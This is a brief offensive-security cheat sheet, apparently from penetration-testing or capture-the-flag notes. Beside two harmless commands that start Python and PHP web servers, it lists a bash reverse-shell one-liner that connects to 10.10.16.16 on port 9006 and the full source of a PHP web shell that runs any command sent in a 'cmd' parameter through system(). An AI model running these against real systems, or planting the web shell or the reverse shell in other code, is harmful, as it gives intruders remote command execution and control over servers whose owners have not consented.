Open WebServer [Python]
```bash
python3 -m http.server <port>
```

Open WebServer [PHP]
```bash
php -S 0.0.0.0:<port>
```

Bash
```bash
/bin/bash -c 'bash+-i >& /dev/tcp/10.10.16.16/9006 0>&1'
```

Web Shell
```php
<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd']);
    }
?>
</pre>
</body>
<script>document.getElementById("cmd").focus();</script>
</html>
```

